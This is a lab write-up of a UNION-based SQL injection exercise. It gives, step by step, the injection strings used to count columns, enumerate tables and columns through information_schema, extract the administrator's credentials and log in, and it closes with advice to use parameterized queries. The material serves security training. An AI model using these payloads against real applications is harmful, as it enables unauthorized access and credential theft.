# SQL Injection Attack — Listing Database Contents on Non-Oracle Databases

## Objective

The goal of this lab was to exploit a SQL injection vulnerability to enumerate the database structure, identify the users table, retrieve the administrator's credentials, and log in as the administrator.

## Methodology

### 1. Determine the Number of Columns

I first tested the vulnerable parameter with a `UNION SELECT` statement:

```sql
' UNION SELECT NULL,NULL--
```

The response confirmed that the original query returned two columns.

### 2. Enumerate Database Tables

I then queried the `information_schema.tables` metadata table:

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

This revealed the following users table:

```
users_afpbyq
```

### 3. Enumerate the Table Columns

Next, I queried `information_schema.columns` to identify the columns in the users table:

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users_afpbyq'--
```

The relevant columns were:

```
username_rxuuor
password_cyatjb
```

### 4. Retrieve User Credentials

I used the discovered table and column names to retrieve the stored credentials:

```sql
' UNION SELECT username_rxuuor,password_cyatjb FROM users_afpbyq--
```

The response contained the `administrator` account and its corresponding password.

### 5. Log In as Administrator

Finally, I used the retrieved credentials on the application's login page:

```
Username: administrator
Password: <retrieved password>
```

The login was successful, completing the lab.

## Conclusion

The application was vulnerable to UNION-based SQL injection because user-controlled input was incorporated into a SQL query without sufficient sanitization or parameterization.

The exploitation process was:

1. Determine the number of columns.
2. Enumerate database tables using `information_schema.tables`.
3. Identify the `users_afpbyq` table.
4. Enumerate its columns using `information_schema.columns`.
5. Extract the administrator's credentials.
6. Authenticate as the administrator.

## Key Takeaways

- `UNION SELECT` can be used to retrieve data from other tables when the injected query is compatible with the original query.
- `information_schema` provides useful metadata about tables and columns in many non-Oracle databases.
- SQL injection can expose sensitive information such as usernames and passwords.
- Applications should use parameterized queries/prepared statements instead of concatenating user input directly into SQL queries.
